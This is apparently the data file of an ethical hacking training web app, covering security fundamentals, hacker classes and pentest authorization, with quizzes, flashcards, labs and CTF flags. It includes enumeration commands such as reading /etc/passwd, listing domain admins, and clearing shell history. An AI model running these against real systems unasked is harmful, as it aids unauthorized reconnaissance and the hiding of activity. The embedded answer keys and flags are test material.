const MODULES = [
  { id:'m01', name: 'Phase 01: Security Analyst Trainee (Introduction to Ethical Hacking)', topics:[
    {id:'info-security-overview',name:'Information Security Overview'},
    {id:'hacker-classes',name:'Hacking Concepts & Hacker Classes'},
    {id:'ethical-hacking-concepts',name:'Ethical Hacking Concepts'},
    {id:'hacking-methodologies',name:'Hacking Methodologies & Frameworks'},
    {id:'security-controls',name:'Information Security Controls'},
    {id:'security-laws',name:'Information Security Laws & Standards'},
  ]},
  { id:'m02', name: 'Phase 02: Threat Intelligence Analyst (Footprinting & Reconnaissance)', topics:[
    {id:'footprinting-concepts',name:'Footprinting Concepts'},
    {id:'osint-techniques',name:'OSINT Techniques'},
    {id:'whois-dns',name:'Whois & DNS Footprinting'},
    {id:'google-hacking',name:'Google Hacking (Dorking)'},
    {id:'shodan-recon',name:'Shodan & Network Recon'},
    {id:'social-media-recon',name:'Social Media Footprinting'},
  ]},
  { id:'m03', name: 'Phase 03: Vulnerability Assessment Analyst (Scanning Networks)', topics:[
    {id:'network-scanning-overview',name:'Network Scanning Overview'},
    {id:'tcp-ip-scanning',name:'TCP/IP & Port Scanning'},
    {id:'nmap-techniques',name:'Nmap Scanning Techniques'},
    {id:'hping3-scanning',name:'Hping3 & Stealth Scanning'},
    {id:'banner-grabbing',name:'Banner Grabbing & OS Fingerprinting'},
  ]},
  { id:'m04', name: 'Phase 04: Vulnerability Assessment Analyst (Enumeration)', topics:[
    {id:'enumeration-overview',name:'Enumeration Concepts'},
    {id:'netbios-smb',name:'NetBIOS & SMB Enumeration'},
    {id:'snmp-ldap',name:'SNMP & LDAP Enumeration'},
    {id:'smtp-dns-enum',name:'SMTP & DNS Enumeration'},
  ]},
  { id:'m05', name: 'Phase 05: Vulnerability Management Specialist (Vulnerability Analysis)', topics:[
    {id:'vuln-concepts',name:'Vulnerability Assessment Concepts'},
    {id:'cve-cvss',name:'CVE, CVSS & NVD'},
    {id:'nessus-openvas',name:'Nessus & OpenVAS Scanning'},
  ]},
  { id:'m06', name: 'Phase 06: Junior Penetration Tester (System Hacking)', topics:[
    {id:'password-cracking',name:'Password Cracking Techniques'},
    {id:'privilege-escalation',name:'Privilege Escalation'},
    {id:'maintaining-access',name:'Maintaining Access & Rootkits'},
    {id:'steganography',name:'Steganography & Covering Tracks'},
  ]},
  { id: 'm07', name: 'Phase 07: Malware Analyst (Malware Threats)', topics: [
      { id: 'malware-concepts', name: 'Malware Concepts' },
      { id: 'trojans-backdoors', name: 'Trojans & Backdoors' },
      { id: 'viruses-worms', name: 'Viruses & Worms' },
      { id: 'fileless-malware', name: 'Fileless Malware' },
      { id: 'malware-analysis', name: 'Malware Analysis' }
    ]},
    { id: 'm08', name: 'Phase 08: Network Security Analyst (Sniffing)', topics: [
      { id: 'sniffing-concepts', name: 'Sniffing Concepts' },
      { id: 'mac-attacks', name: 'MAC Attacks' },
      { id: 'dhcp-attacks', name: 'DHCP Attacks' },
      { id: 'arp-poisoning', name: 'ARP Poisoning' },
      { id: 'spoofing-mitm', name: 'Spoofing & MITM' }
    ]},
    { id: 'm09', name: 'Phase 09: Security Awareness Officer (Social Engineering)', topics: [
      { id: 'social-engineering-concepts', name: 'Social Engineering Concepts' },
      { id: 'phishing-campaigns', name: 'Phishing Campaigns' },
      { id: 'insider-threats', name: 'Insider Threats' },
      { id: 'impersonation', name: 'Impersonation & Pretexting' }
    ]},
    { id: 'm10', name: 'Phase 10: Network Defense Analyst (Denial of Service)', topics: [
      { id: 'dos-concepts', name: 'DoS/DDoS Concepts' },
      { id: 'botnets', name: 'Botnets' },
      { id: 'dos-attack-techniques', name: 'Attack Techniques' },
      { id: 'ddos-mitigation', name: 'DDoS Mitigation' }
    ]},
    { id: 'm11', name: 'Phase 11: Application Security Analyst (Session Hijacking)', topics: [
      { id: 'session-hijacking-concepts', name: 'Session Hijacking Concepts' },
      { id: 'application-level-hijacking', name: 'Application Level Hijacking' },
      { id: 'network-level-hijacking', name: 'Network Level Hijacking' },
      { id: 'session-hijacking-tools', name: 'Session Hijacking Tools & Countermeasures' }
    ]},
    { id: 'm12', name: 'Phase 12: Advanced Penetration Tester (Evading IDS/Firewalls)', topics: [
      { id: 'ids-firewall-concepts', name: 'IDS & Firewall Concepts' },
      { id: 'evasion-techniques', name: 'Evasion Techniques' },
      { id: 'honeypot-concepts', name: 'Honeypot Architecture' },
      { id: 'evasion-tools', name: 'Evasion Tools & Countermeasures' }
    ]},
    { id: 'm13', name: 'Phase 13: Web Application Pentester (Web Server Hacking)', topics: [
      { id: 'web-server-concepts', name: 'Web Server Concepts' },
      { id: 'web-server-attacks', name: 'Web Server Attacks' },
      { id: 'web-server-attack-methodology', name: 'Attack Methodology' },
      { id: 'web-server-security-tools', name: 'Security Tools & Countermeasures' }
    ]},
    { id: 'm14', name: 'Phase 14: Web Application Pentester (Hacking Web Applications)', topics: [
      { id: 'web-app-concepts', name: 'Web App Architecture & Concepts' },
      { id: 'web-app-threats', name: 'Web App Threats (OWASP Top 10)' },
      { id: 'web-app-hacking-methodology', name: 'Web App Hacking Methodology' },
      { id: 'web-app-security-tools', name: 'Web App Security Tools' }
    ]},
    { id: 'm15', name: 'Phase 15: Database Security Specialist (SQL Injection)', topics: [
      { id: 'sqli-concepts', name: 'SQL Injection Concepts' },
      { id: 'sqli-types', name: 'Types of SQL Injection' },
      { id: 'sqli-methodology', name: 'SQLi Methodology' },
      { id: 'sqli-tools', name: 'SQLi Tools & Countermeasures' }
    ]},
    { id: 'm16', name: 'Phase 16: Network Security Specialist (Wireless Networks)', topics: [
      { id: 'wireless-concepts', name: 'Wireless Concepts' },
      { id: 'wireless-encryption', name: 'Wireless Encryption' },
      { id: 'wireless-threats', name: 'Wireless Threats & Attacks' },
      { id: 'wireless-hacking-tools', name: 'Wireless Hacking Tools' }
    ]},
    { id: 'm17', name: 'Phase 17: Mobile Security Expert (Mobile Platforms)', topics: [
      { id: 'mobile-concepts', name: 'Mobile Platform Architecture' },
      { id: 'android-hacking', name: 'Android Hacking' },
      { id: 'ios-hacking', name: 'iOS Hacking' },
      { id: 'mobile-security-tools', name: 'Mobile Security Tools' }
    ]},
    { id: 'm18', name: 'Phase 18: OT/IoT Security Specialist (IoT & OT Hacking)', topics: [
      { id: 'iot-concepts', name: 'IoT Concepts & Architecture' },
      { id: 'ot-concepts', name: 'OT Concepts & Architecture' },
      { id: 'iot-ot-threats', name: 'IoT & OT Threats' },
      { id: 'iot-ot-hacking-tools', name: 'IoT & OT Hacking Tools' }
    ]},
    { id: 'm19', name: 'Phase 19: Cloud Security Architect (Cloud Computing)', topics: [
      { id: 'cloud-concepts', name: 'Cloud Computing Concepts' },
      { id: 'cloud-threats', name: 'Cloud Threats & Attacks' },
      { id: 'cloud-architecture', name: 'Cloud Security Architecture' },
      { id: 'cloud-security-tools', name: 'Cloud Security Tools' }
    ]},
    { id: 'm20', name: 'Phase 20: Cryptography Expert (Cryptography)', topics: [
      { id: 'crypto-concepts', name: 'Cryptography Concepts' },
      { id: 'encryption-algorithms', name: 'Encryption Algorithms' },
      { id: 'pki-concepts', name: 'Public Key Infrastructure (PKI)' },
      { id: 'crypto-attacks', name: 'Cryptography Attacks' }
    ]}
];

const CONTENT = {
  'info-security-overview':{"module":"Module 01 \u2014 Introduction to Ethical Hacking","title":"Information Security Overview","sub":"Understanding the CIA Triad, threat landscape, and foundational security concepts in an enterprise context.","killchain":{"phase":"Pre-Attack Phase","mitre":"Foundation","desc":"Core concepts that underpin all CEH domains and attack methodologies."},"learn":{"simple":"<strong>DEFINITION & SIMPLE EXPLANATION</strong><br><br>Information security is the practice of protecting data from unauthorized access, modification, or destruction. In an enterprise environment like Global Financial Services (GFS), it means ensuring that customer data, trading algorithms, and internal communications remain secure against an ever-evolving threat landscape.<br><br><strong>ENTERPRISE BRIEFING</strong><br>As a Security Analyst at GFS, your primary mission is to defend the CIA Triad (Confidentiality, Integrity, Availability) across all business units.","analogy":"<strong>ANALOGY</strong><br><br>Think of a bank vault. The CIA Triad are the three locks on the vault door.<br><ul><li><strong>Confidentiality:</strong> Only authorized people have the combination (Encryption, Access Control).</li><li><strong>Integrity:</strong> No one can tamper with the cash inside without it being detected (Hashing, Digital Signatures).</li><li><strong>Availability:</strong> The vault door opens quickly and reliably when the branch manager needs it (DDoS Protection, Redundancy).</li></ul><br><strong>5W1H CONTEXT</strong><br><strong>What:</strong> Protecting information assets.<br><strong>Why:</strong> To prevent financial loss and regulatory fines.<br><strong>Who:</strong> Security Analysts, Architects, and every employee.<br><strong>When:</strong> Continuous monitoring 24/7/365.<br><strong>Where:</strong> On-premise, cloud, and endpoints.<br><strong>How:</strong> People, Process, and Technology.","why":"<strong>THREAT INTELLIGENCE & BUSINESS CONTEXT (GFS)</strong><br><br>Without understanding security fundamentals, attackers exploit the gaps between policy and implementation. At GFS, a breach of confidentiality (e.g., leaked customer PII) violates GDPR and PCI-DSS, resulting in massive fines. A breach of integrity (tampered transaction records) destroys market trust.<br><br>Threat actors continuously probe GFS perimeters using automated reconnaissance, phishing, and zero-day exploits. Every penetration test starts with understanding what the target is trying to protect.","architecture":"<strong>TECHNICAL DEEP DIVE & ENTERPRISE WORKFLOW</strong><br><br>Information security operates across multiple defense layers: Physical (server rooms, badge access), Network (firewalls, IDS/IPS), and Application (input validation, authentication). The OSI model maps directly to these layers, and CEH attacks target each one.<br><br><strong>ENTERPRISE WORKFLOW:</strong><br>1. <strong>Identify:</strong> Asset inventory and data classification.<br>2. <strong>Protect:</strong> Implement firewalls, MFA, and encryption.<br>3. <strong>Detect:</strong> Deploy SIEM and IDS to monitor anomalies.<br>4. <strong>Respond:</strong> Incident Response (IR) team contains the threat.<br>5. <strong>Recover:</strong> Restore from encrypted backups and patch vulnerabilities."},"diagram":{"title":"Information Security Threat Lifecycle","steps":[{"icon":"\ud83d\udc64","label":"Threat Actor Emerges","desc":"An adversary identifies GFS as a target with valuable data or systems."},{"icon":"\ud83d\udd0d","label":"Reconnaissance","desc":"The attacker researches: open ports, employee names, software versions, IP ranges via OSINT."},{"icon":"\ud83d\udca5","label":"Exploit Vulnerability","desc":"A weakness is exploited \u2014 unpatched software, weak password, phishing, or misconfiguration."},{"icon":"\ud83d\udd13","label":"CIA Triad Violated","desc":"Data is stolen (Confidentiality), altered (Integrity), or systems go offline (Availability)."},{"icon":"\ud83d\udee1\ufe0f","label":"Detection & Response","desc":"SIEM, IDS, or SOC analysts detect anomaly and trigger the incident response process."},{"icon":"\ud83d\udccb","label":"Remediation & Lessons","desc":"Root cause fixed, controls updated, post-incident report filed to prevent recurrence."}]},"enterprise":{"gfs":"<strong>ENTERPRISE SCENARIO \u2014 GLOBALFINSEC CORP</strong><br>You are the Security Architect at GlobalFinSec Corp.<br><br><strong>SITUATION</strong><br>An external audit flagged three critical gaps: no asset inventory, no data classification policy, and no formal incident response plan \u2014 ahead of a PCI-DSS compliance deadline.<br><br><strong>YOUR CHALLENGE</strong><br>Map the CIA Triad to the top three assets (trading platform, customer database, internal email) and identify which controls are missing for each.","steps":["List the three assets and classify them by CIA priority (customer DB = highest Confidentiality need).","Run: `nmap -sV 192.168.1.0/24` to discover what services are exposed on each asset.","Check for missing patches on Windows hosts: `systeminfo | findstr \"OS Version\"`.","Identify existing controls (firewall? MFA? encryption?) and document gaps.","Write a one-page risk register: Asset, Threat, Vulnerability, CIA Impact, Recommended Control."],"outcome":"<strong>Outcome:</strong> You identified 12 missing controls. The trading platform lacked MFA (Confidentiality), the database had no encryption at rest (Confidentiality + Integrity), and email had no DLP (Confidentiality).<br><strong>Key Lesson:</strong> Every security investment must map to a CIA pillar. Without this framing, security spending cannot be justified to the board."},"tools":[{"name":"Nmap","desc":"Network discovery and port scanning.","cmd":"nmap -sV target"},{"name":"OpenVAS","desc":"Open-source vulnerability scanner.","cmd":"openvas-start"},{"name":"Nessus","desc":"Enterprise vulnerability scanner.","cmd":"service nessusd start"}],"commands":{"win":[{"cmd":"systeminfo","purpose":"Displays detailed configuration information about a computer and its operating system.","out":"Host Name: GFS-WKSTN-01\\nOS Name: Microsoft Windows 10 Enterprise\\nOS Version: 10.0.19044 N/A Build 19044","note":"Useful for identifying the exact OS build to find missing patches.","mistake":"Running without piping to `findstr` can overwhelm the terminal with output."},{"cmd":"net user","purpose":"Displays a list of all user accounts on the computer.","out":"User accounts for \\\\GFS-WKSTN-01\\n-------------------------------------------------------------------------------\\nAdministrator            Guest                    jdoe\\nThe command completed successfully.","note":"First step in local enumeration to find unauthorized accounts.","mistake":"Does not show domain users unless `/domain` switch is used."}],"lin":[{"cmd":"uname -a","purpose":"Print system information including kernel version.","out":"Linux GFS-DB-01 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 x86_64 GNU/Linux","note":"Critical for finding kernel exploits (e.g., Dirty COW).","mistake":"Relying only on `uname`; always check `/etc/os-release` as well."},{"cmd":"id","purpose":"Print real and effective user and group IDs.","out":"uid=1000(jdoe) gid=1000(jdoe) groups=1000(jdoe),27(sudo)","note":"Check if the compromised user is in the `sudo` group for privilege escalation.","mistake":"Forgetting to check the groups section which often hides lateral movement paths."},{"cmd":"cat /etc/passwd","purpose":"List all user accounts on the Linux system.","out":"root:x:0:0:root:/root:/bin/bash\\njdoe:x:1000:1000:John Doe,,,:/home/jdoe:/bin/bash","note":"Look for accounts with `/bin/bash` or `/bin/sh` to identify interactive users.","mistake":"Assuming passwords are in this file; they are hashed in `/etc/shadow`."}]},"pitfalls":[{"title":"Mistaking Compliance for Security","desc":"Passing a PCI-DSS or ISO audit does not mean you are secure. Compliance is a minimum bar, not a security guarantee.","fix":"Treat compliance as the floor. Layer additional threat-model-driven controls beyond regulatory minimums."},{"title":"Neglecting Availability in Security Planning","desc":"Security teams over-focus on Confidentiality (encryption, access control) and neglect Availability until a DDoS hits.","fix":"Include RTO/RPO metrics in all security plans. Regularly test failover and backup restoration."},{"title":"Treating Risk as a One-Time Assessment","desc":"A yearly risk assessment misses new vulnerabilities introduced by software updates, new vendors, and infrastructure changes.","fix":"Implement continuous risk monitoring. Reassess whenever major changes occur."},{"title":"Over-Relying on Perimeter Security","desc":"The castle-and-moat model assumes threats come from outside. Modern threats (insiders, cloud misconfigs) originate inside.","fix":"Adopt Zero Trust: verify every request as untrusted regardless of source location."}],"lab":{"title":"Enterprise Scenario: Information Security Core Concepts","scenario":"You are a junior SOC analyst at Global Financial Services. A new Linux server has been deployed in the DMZ without going through the standard security review process. You need to perform initial reconnaissance and identify the CIA triad implications of the current configuration.","objectives":["Perform basic local enumeration to identify the OS and users.","Determine the exposed services.","Correlate findings to CIA Triad risks."],"safety":["Ensure you have written authorization before scanning any GFS assets."],"dependencies":[],"steps":["Step 1: Open your Kali terminal.","Step 2: Identify your current privilege level: `id`.","Step 3: Check the system OS version: `uname -a` and `cat /etc/os-release`.","Step 4: View the active network connections to see what is exposed: `netstat -tulnp`.","Step 5: Review the local user accounts to see if default accounts exist: `cat /etc/passwd`."],"evidence":["Terminal output showing the OS version.","Terminal output showing open ports (e.g., port 22, 80)."],"validation":["You should be able to state exactly which services are running and what the impact would be if they were compromised (e.g., port 80 down = Availability impact)."],"troubleshooting":["If `netstat` is not found, use `ss -tulnp` instead."],"mitre":[{"id":"T1082","name":"System Information Discovery","tactic":"Discovery"}],"cleanup":["Clear your terminal history: `history -c`."]},"quiz":[{"type":"multiple-choice","difficulty":"Easy","q":"Which component of the CIA Triad ensures that information is accessible only to those authorized to have access?","opts":["Confidentiality","Integrity","Availability","Non-repudiation"],"correct":0,"fb":"Confidentiality ensures that data is kept secret from unauthorized entities, typically implemented through encryption and access controls."},{"type":"multiple-choice","difficulty":"Easy","q":"Which component of the CIA Triad ensures that information is not altered by unauthorized persons?","opts":["Confidentiality","Integrity","Availability","Authentication"],"correct":1,"fb":"Integrity guarantees that data has not been changed, destroyed, or lost in an unauthorized or accidental manner. Hashing is a common integrity control."},{"type":"multiple-choice","difficulty":"Easy","q":"A DDoS attack primarily targets which component of the CIA Triad?","opts":["Confidentiality","Integrity","Availability","Non-repudiation"],"correct":2,"fb":"Availability ensures that systems and data are accessible to authorized users when needed. DDoS attacks aim to disrupt this accessibility."},{"type":"multiple-choice","difficulty":"Intermediate","q":"Which of the following best describes 'Non-repudiation'?","opts":["Preventing unauthorized access to data.","Ensuring a sender cannot deny having sent a message.","Guaranteeing system uptime.","Hashing a file to verify its integrity."],"correct":1,"fb":"Non-repudiation ensures that a party to a transaction cannot deny having received a transaction nor can the other party deny having sent a transaction (e.g., using digital signatures)."},{"type":"multiple-choice","difficulty":"Intermediate","q":"What is the primary difference between a Vulnerability and an Exploit?","opts":["A vulnerability is a weakness; an exploit is a tool used to take advantage of it.","A vulnerability is a tool; an exploit is a weakness.","A vulnerability only applies to software; an exploit applies to hardware.","There is no difference; the terms are synonymous."],"correct":0,"fb":"A vulnerability is a flaw or weakness in system security procedures, design, implementation, or internal controls. An exploit is a defined way to breach the security of an IT system through a vulnerability."},{"type":"multiple-choice","difficulty":"Intermediate","q":"Which term describes a potential occurrence that can result in an unwanted outcome for an organization?","opts":["Vulnerability","Threat","Risk","Exploit"],"correct":1,"fb":"A threat is an event or condition that has the potential for causing asset loss and the undesirable consequences or impact from such loss."},{"type":"multiple-choice","difficulty":"Hard","q":"In risk management, how is Risk formally calculated?","opts":["Risk = Threat \u00d7 Vulnerability \u00d7 Asset Value","Risk = Threat + Vulnerability","Risk = Asset Value / Threat","Risk = Vulnerability \u00d7 Exploit"],"correct":0,"fb":"Risk is a function of the likelihood of a given threat-source exercising a particular potential vulnerability, and the resulting impact of that adverse event on the organization (Asset Value)."},{"type":"multiple-choice","difficulty":"Hard","q":"A company implements a biometric scanner to access the server room. This is an example of what type of security control?","opts":["Administrative Control","Technical (Logical) Control","Physical Control","Detective Control"],"correct":2,"fb":"Physical controls are tangible measures taken to protect systems and personnel (e.g., guards, locks, biometric scanners at doors)."},{"type":"true-false","difficulty":"Intermediate","q":"An Acceptable Use Policy (AUP) is an example of an Administrative Control.","opts":["True","False"],"correct":0,"fb":"True. Administrative controls are policies, procedures, and regulations that direct personnel on how to maintain security."},{"type":"multiple-choice","difficulty":"Intermediate","q":"Which of the following is considered a Detective Control?","opts":["Firewall","Intrusion Detection System (IDS)","Data Encryption","Security Guard"],"correct":1,"fb":"An IDS is a detective control designed to identify and alert on malicious activity after or as it occurs. A firewall is a preventative control."}],"flashcards":[{"f":"Confidentiality","b":"Ensuring data is only accessible to authorized individuals (e.g., via encryption)."},{"f":"Integrity","b":"Ensuring data is not altered or tampered with (e.g., via hashing)."},{"f":"Availability","b":"Ensuring systems and data are accessible when needed (e.g., via redundancy)."},{"f":"Non-repudiation","b":"Ensuring a sender cannot deny sending a message, often achieved via digital signatures."},{"f":"Vulnerability","b":"A weakness in a system, application, or process that can be exploited."},{"f":"Threat","b":"A potential danger that could exploit a vulnerability (e.g., a hacker, malware, natural disaster)."},{"f":"Exploit","b":"A piece of software, data, or sequence of commands that takes advantage of a vulnerability."},{"f":"Risk","b":"The potential for loss, damage, or destruction of an asset. (Threat \u00d7 Vulnerability \u00d7 Asset Value)."},{"f":"Physical Control","b":"Tangible security measures like locks, fences, and security guards."},{"f":"Administrative Control","b":"Policies, procedures, and training designed to direct human behavior (e.g., AUP)."}],"summary":["The CIA Triad (Confidentiality, Integrity, Availability) is the foundation of information security.","Security controls are categorized into Physical, Technical (Logical), and Administrative types.","Risk management involves identifying assets, threats, and vulnerabilities to calculate and mitigate risk.","Compliance with laws and standards (PCI-DSS, GDPR) is mandatory but does not equal complete security.","Modern enterprise security requires a defense-in-depth strategy, layering multiple controls."],"outcomes":["Define the core concepts of information security and the CIA Triad.","Differentiate between vulnerabilities, threats, exploits, and risks.","Identify and classify various types of security controls (Physical, Technical, Administrative).","Understand the importance of compliance frameworks in an enterprise context."]},

  'hacker-classes':{
    module:'Module 01 · Introduction to Ethical Hacking',
    title:'Hacking Concepts & Hacker Classes',
    sub:'Threat actor taxonomy, hacker motivations, and attack classification.',
    killchain:{phase:'Pre-Attack Phase',mitre:'TA0043 — Reconnaissance',desc:'Understanding who the adversary is determines the attack methodology to simulate.'},
    learn:{simple:'Hackers are broadly classified by their intent and authorization level. White hats hack with permission to improve security; black hats hack illegally for malicious gain; grey hats fall somewhere in between.',analogy:'Think of locksmiths: a licensed locksmith (white hat) uses the same skills as a burglar (black hat), but with permission. A grey hat is like someone who breaks in but then calls the owner to say the lock is weak.',why:'Understanding attacker motivations and categories helps defenders predict attack methods, model threats accurately, and build the right defenses.',architecture:'Categories include White Hat (ethical), Black Hat (criminal), Grey Hat (ambiguous), Hacktivists (ideology), APT/State-sponsored (espionage), Script Kiddies (low-skill), Insiders (trusted but malicious).'},
    tools:[{name:'Maltego',cmd:'maltego',desc:'OSINT and threat actor visualization'},{name:'theHarvester',cmd:'theharvester -d target.com -b all',desc:'Email and domain intelligence'}],
    commands:{win:['whoami /all','net user /domain','net group "Domain Admins" /domain'],lin:['id','groups','cat /etc/group','last']},
    ctf:{scenario:'A SOC alert fires: an insider with legitimate credentials is exfiltrating data to a personal Dropbox. What class of hacker are they?',hint:'They have authorized access but malicious intent...',flag:'CEH{wh1t3_gr3y_bl4ck_h4t}',points:100},
    quiz:[
      {q:'Which hacker type operates with full authorization?',opts:['Black Hat','Grey Hat','White Hat','Hacktivist'],correct:2,fb:'White hat hackers (ethical hackers/penetration testers) work with written permission from the target organization.'},
      {q:'A hacker who breaks in without permission but reports vulnerabilities to the vendor is called:',opts:['White Hat','Grey Hat','Black Hat','Script Kiddie'],correct:1,fb:'Grey hat hackers operate in a legal grey area — they may hack without permission but typically do not have malicious intent and may disclose findings.'},
      {q:'Anonymous and LulzSec are examples of:',opts:['APT Groups','Hacktivists','Script Kiddies','Insiders'],correct:1,fb:'Hacktivists use hacking to promote political or social agendas — Anonymous and LulzSec are well-known examples.'},
      {q:'What is the primary motivation of a state-sponsored APT group?',opts:['Financial gain','Fame','Espionage and geopolitical objectives','Social justice'],correct:2,fb:'Advanced Persistent Threats (APTs) backed by nation-states primarily aim for long-term espionage, IP theft, and disruption of critical infrastructure.'},
      {q:'A script kiddie is characterized by:',opts:['Advanced programming skills','Using pre-written tools without deep understanding','Nation-state backing','Professional authorization'],correct:1,fb:'Script kiddies use existing tools and exploits without understanding the underlying techniques — they pose a real threat despite limited skill.'},
      {q:'Which threat actor is hardest to detect and defend against?',opts:['Script Kiddie','External Black Hat','Malicious Insider','Hacktivist'],correct:2,fb:'Malicious insiders already have legitimate access, making their activities harder to distinguish from normal behavior.'},
      {q:'At GlobalFinCorp, an admin sells database credentials to a competitor. What actor type is this?',opts:['APT','Hacktivist','Malicious Insider','Script Kiddie'],correct:2,fb:'A malicious insider uses legitimate access for unauthorized or malicious purposes — the most dangerous threat in enterprise environments.'},
      {q:'A CEH is simulating an APT attack on a bank. Which approach should they take?',opts:['Quick hit-and-run scan','Long-term persistent simulation with multiple attack stages','Single vulnerability exploit','Social media scraping only'],correct:1,fb:'APT simulation (Red Team exercises) involves long-term persistent attack chains mimicking real state-sponsored actors, not single-shot scans.'},
      {q:'What legal document must a white hat hacker have before testing?',opts:['NDA only','Verbal agreement','Written authorization and Rules of Engagement','Business card'],correct:2,fb:'Written authorization (often called a Statement of Work or Rules of Engagement) is the legal foundation of all ethical hacking engagements.'},
      {q:'Which hacker class poses the greatest financial threat to organizations globally?',opts:['Hacktivists','Script Kiddies','Cybercriminal groups','Grey Hats'],correct:2,fb:'Organized cybercriminal groups (ransomware operators, financial fraud groups) cause the greatest financial losses globally, totaling trillions annually.'},
    ],
    flashcards:[
      {f:'White Hat',b:'Ethical hacker with written permission. Works to improve security.'},
      {f:'Black Hat',b:'Malicious hacker. No authorization. Criminal intent.'},
      {f:'Grey Hat',b:'Hacks without permission but usually reports findings. Legal grey area.'},
      {f:'Hacktivist',b:'Hacker motivated by political or social ideology (e.g., Anonymous).'},
      {f:'APT',b:'Advanced Persistent Threat — state-sponsored, long-term, stealthy attack campaigns.'},
      {f:'Insider Threat',b:'Malicious or negligent employee with legitimate system access.'},
      {f:'Script Kiddie',b:'Low-skill attacker using pre-made tools without understanding them.'},
    ],
    summary:[
      'Hacker classification is based on authorization and intent, not technical skill.',
      'APTs represent the most sophisticated threat — long-term, stealthy, state-backed.',
      'Insiders are the hardest threat to detect as they have legitimate access.',
      'Every ethical hacker must have written authorization before any testing.',
    ],
    diagram:{
      title:'Hacker Classification Decision Tree',
      steps:[
        {icon:'⚖️',label:'Assess Intent',desc:'Is the actor motivated by financial gain, ideology, espionage, curiosity, or authorized testing?'},
        {icon:'🔑',label:'Check Authorization',desc:'Does the actor have explicit written permission from the target? White hat = yes. Everyone else = no.'},
        {icon:'🎯',label:'Identify Target Type',desc:'Opportunistic (random victims) vs. targeted (specific org, person, or system)?'},
        {icon:'🛠️',label:'Evaluate Skill',desc:'Script kiddie (pre-built tools, zero understanding) vs. sophisticated (custom exploits, zero-days, persistence).'},
        {icon:'🏷️',label:'Apply Classification',desc:'White Hat, Grey Hat, Black Hat, Hacktivist, APT/Nation-State, Malicious Insider, or Script Kiddie.'},
        {icon:'🛡️',label:'Tailor Defenses',desc:'Match your defense investment to the most likely threat actors for your industry and data profile.'}
      ]
    },
    enterprise:{
      role:'You are the Threat Intelligence Analyst at GlobalFinSec Corp.',
      situation:'A SOC alert fires at 2 AM: a privileged database administrator is transferring 50GB of customer records to a personal Dropbox account.',
      challenge:'Classify this threat actor, determine their likely motivation, and recommend immediate containment actions.',
      steps:[
        'Pull the employee access logs for the past 30 days — is this the first anomalous transfer?',
        'Check HR records — any recent performance reviews, disciplinary actions, or resignation notices?',
        'Verify if the destination IP is on threat intelligence blocklists (VirusTotal, AbuseIPDB).',
        'Classify: this is a Malicious Insider — authorized access, clearly malicious intent.',
        'Trigger the Insider Threat IR playbook: disable account, preserve forensic evidence, notify Legal and HR.'
      ],
      outcome:'The employee was a departing staff member harvesting customer PII for a competitor. Early DLP and UEBA detection prevented full exfiltration. The employee was prosecuted under the CFAA.',
      lesson:'Insiders are the hardest threat to detect because their traffic looks legitimate. The solution is behavioral analytics (UEBA), not just perimeter firewalls.'
    },
    pitfalls:[
      {icon:'⚠️',title:'Underestimating Script Kiddies',desc:'Organizations dismiss script kiddies as low-skill noise. But automated tools (Metasploit, SQLmap) require zero expertise and can cause real damage at scale.',fix:'Patch all publicly-known CVEs promptly. Most script kiddie attacks exploit unpatched, well-documented vulnerabilities.'},
      {icon:'🔴',title:'Focusing All Defenses on External Threats',desc:'Most security budgets go to perimeter controls. But Verizon DBIR shows insiders cause 20-30% of all breaches.',fix:'Implement insider threat programs: UEBA, DLP, Privileged Access Management (PAM), and quarterly access reviews.'},
      {icon:'⛔',title:'Treating Grey Hat Reports as Goodwill',desc:'Grey hats who report vulnerabilities after unauthorized testing are still committing a crime under CFAA/Computer Misuse Act.',fix:'Establish a formal Bug Bounty or Responsible Disclosure program. Never encourage unsolicited testing.'}
    ],
    lab:{title:'Lab: Threat Actor Profiling',steps:['Research a real APT group (e.g., APT28, Lazarus Group) on MITRE ATT&CK (attack.mitre.org).','Identify their known TTPs (Tactics, Techniques, Procedures).','Map their attack chain to the CEH 5-phase methodology.','Identify which industries they primarily target.','Write a one-page threat actor profile for a mock board presentation.']}
  },

  'ethical-hacking-concepts':{
    module:'Module 01 · Introduction to Ethical Hacking',
    title:'Ethical Hacking Concepts',
    sub:'Scope, authorization, methodologies, and the legal framework of penetration testing.',
    killchain:{phase:'Pre-Engagement',mitre:'Foundation',desc:'All ethical hacking begins with proper authorization and defined scope — no exceptions.'},
    learn:{simple:'Ethical hacking is the practice of legally and intentionally probing systems for security vulnerabilities, using the same skills and tools as malicious hackers — but with explicit written permission from the target.',analogy:'Ethical hackers are like the security testers hired by a bank to try to break into the vault before real criminals do. The bank gives them the keys and a rulebook; without it, they would be criminals themselves.',why:'Organizations cannot know their true security posture without someone actively trying to break it. Ethical hackers provide a controlled, legal simulation of real attacks to find gaps before real attackers exploit them.',architecture:'Ethical hacking follows a structured process: define scope, get written authorization (Rules of Engagement), conduct testing across 5 phases, report findings, and remediate. Key laws include the CFAA (USA), Computer Misuse Act (UK), and IT Act (India).'},
    tools:[{name:'Dradis',cmd:'dradis',desc:'Reporting and collaboration framework'},{name:'Metasploit',cmd:'msfconsole',desc:'Exploitation framework (authorized use only)'}],
    commands:{win:['ipconfig /all','netstat -an','tasklist /svc'],lin:['ifconfig -a','netstat -tulnp','ps aux']},
    ctf:{scenario:'A security firm is asked to test a bank website. The CEO verbally approves the test. Is this sufficient to begin testing?',hint:'What document is legally required before any pen test?',flag:'CEH{3th1c4l_h4ck3r_m4nd4t3}',points:100},
    quiz:[
      {q:'What is the MOST important document before starting a pen test?',opts:['NDA','Written Authorization / Statement of Work','Verbal Approval Email','LinkedIn Profile'],correct:1,fb:'Written authorization (Rules of Engagement/SOW) is legally mandatory. Verbal approval is insufficient and leaves you legally exposed.'},
      {q:'What defines the boundaries of a penetration test?',opts:['The tester\'s skills','Scope of Engagement','Budget','Time allocated'],correct:1,fb:'The Scope of Engagement defines what systems, networks, and methods are authorized — testing outside scope is illegal.'},
      {q:'Which phase comes LAST in the CEH methodology?',opts:['Scanning','Gaining Access','Covering Tracks','Maintaining Access'],correct:2,fb:'CEH\'s 5 phases: Reconnaissance → Scanning → Gaining Access → Maintaining Access → Covering Tracks.'},
      {q:'A penetration test simulates attacks from which perspective?',opts:['Defender','Attacker','Regulator','Auditor'],correct:1,fb:'Ethical hacking adopts the attacker\'s mindset — thinking like a threat actor to find vulnerabilities before real attackers do.'},
